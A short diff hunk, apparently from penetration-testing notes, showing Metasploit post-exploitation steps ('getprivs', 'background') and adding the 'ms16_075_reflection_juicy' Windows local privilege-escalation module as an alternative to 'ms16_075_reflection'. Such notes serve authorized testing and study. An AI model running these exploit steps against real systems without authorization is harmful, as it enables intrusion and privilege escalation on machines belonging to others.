@@ -236,6 +236,9 @@ getprivs
 background
 
 use exploit/windows/local/ms16_075_reflection
+or
+use exploit/windows/local/ms16_075_reflection_juicy 
+
 
 options
 
